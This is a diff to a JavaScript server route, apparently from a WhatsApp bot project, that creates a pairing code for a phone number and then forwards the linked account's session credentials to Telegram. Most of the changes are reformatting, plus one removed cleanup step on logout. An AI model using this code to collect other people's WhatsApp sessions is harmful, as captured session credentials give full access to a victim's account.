@@ -1,25 +1,7 @@
-/**
- * ═══════════════════════════════════════════════════════
- * 🔢 PAIR CODE | ربط برقم الهاتف
- * ═══════════════════════════════════════════════════════
- * 👑 المطور: آدم (شادو) | Adam (Shadow)
- * 🤖 البوت: سوكونا | Sukuna
- * 🏷️ الحقوق: ${global.author}
- * 📜 الوصف: توليد كود ربط Pairing Code وإرسال الجلسة للتليجرام
- * ═══════════════════════════════════════════════════════
- */
-
 import express from 'express';
 import fs from 'fs';
 import pino from 'pino';
-import { 
-  makeWASocket, 
-  useMultiFileAuthState, 
-  delay, 
-  makeCacheableSignalKeyStore, 
-  Browsers, 
-  fetchLatestBaileysVersion 
-} from '@whiskeysockets/baileys';
+import { makeWASocket, useMultiFileAuthState, delay, makeCacheableSignalKeyStore, Browsers, jidNormalizedUser, fetchLatestBaileysVersion } from '@whiskeysockets/baileys';
 import pn from 'awesome-phonenumber';
 import { sendSessionToTelegram } from './lib/sender.js';
 
@@ -29,9 +11,7 @@ function removeFile(FilePath) {
   try {
     if (!fs.existsSync(FilePath)) return false;
     fs.rmSync(FilePath, { recursive: true, force: true });
-  } catch (e) {
-    console.error('Error removing file:', e);
-  }
+  } catch (e) {console.error('Error removing file:', e)}
 }
 
 router.get('/', async (req, res) => {
@@ -45,7 +25,7 @@ router.get('/', async (req, res) => {
   }
   num = phone.getNumber('e164').replace('+', '');
 
-  const dirs = `./temp_sessions/${num}`;
+  const dirs = './temp_sessions/' + num;
   await removeFile(dirs);
   if (!fs.existsSync('./temp_sessions')) fs.mkdirSync('./temp_sessions', { recursive: true });
 
@@ -77,18 +57,10 @@ router.get('/', async (req, res) => {
         if (connection === 'open') {
           console.log("✅ Connected successfully!");
           try {
-            // انتظار حفظ الكريدز
+            // ننتظر شوية عشان الكريدز تتحفظ
             await delay(2000);
-            
-            // إرسال الجلسة للتليجرام كنص JSON
             await sendSessionToTelegram(dirs, num);
-            
-            res.status(200).send({ 
-              code: 'SUCCESS', 
-              message: 'تم الربط بنجاح وجاري إرسال الجلسة للبوت الرئيسي' 
-            });
-            
-            // تنظيف الملفات المؤقتة
+            res.status(200).send({ code: 'SUCCESS', message: 'تم الربط بنجاح وجاري إرسال الجلسة للبوت الرئيسي' });
             setTimeout(() => removeFile(dirs), 5000);
           } catch (error) {
             console.error("❌ Error sending session:", error);
@@ -101,7 +73,6 @@ router.get('/', async (req, res) => {
           const statusCode = lastDisconnect?.error?.output?.statusCode;
           if (statusCode === 401) {
             console.log("❌ Logged out");
-            removeFile(dirs);
           } else {
             console.log("🔁 Connection closed — restarting...");
             initiateSession();
